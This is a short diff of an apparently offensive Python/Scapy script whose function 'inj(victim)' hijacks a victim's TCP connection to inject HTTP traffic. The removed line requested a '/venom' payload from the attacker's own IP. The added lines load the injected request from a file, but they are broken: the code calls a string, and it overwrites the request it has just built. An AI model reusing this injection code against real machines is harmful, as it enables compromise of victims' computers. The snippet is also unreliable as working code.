@@ -37,7 +37,10 @@ def inj(victim): #victim pc injection
     akn = sr1(ips/tcps, timeout=3, verbose=False)
     tcps.src = akn[TCP].dport
     tcps.dport = akn[TCP].sport
-    req = HTTP()/HTTPRequest(Method='GET', Host=mp, Path='/venom', User_Agent='')
+    req = HTTP()/HTTPRequest()
+    f = open('inject.txt', 'r')
+    reqdata = f.read()
+    req = reqdata()
 mp = myip()
 pkts1 = None
 pkts2 = None
